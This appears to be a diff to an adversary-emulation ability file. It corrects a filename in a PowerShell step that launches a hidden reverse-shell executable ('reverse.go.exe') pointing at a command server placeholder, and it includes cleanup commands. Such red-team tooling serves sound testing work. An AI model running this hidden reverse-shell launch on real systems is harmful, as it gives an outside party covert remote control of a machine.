@@ -22,7 +22,7 @@
       psh:
         command: |
           mv reverse.go reverse.go.exe;
-          Start-Process -FilePath .\reverse.go-windows.exe -ArgumentList "-tcp 127.0.0.1:5678 -http #{server}" -WindowStyle hidden;
+          Start-Process -FilePath .\reverse.go.exe -ArgumentList "-tcp 127.0.0.1:5678 -http #{server}" -WindowStyle hidden;
         cleanup: |
           rm reverse.go;
           rm reverse.go.exe;
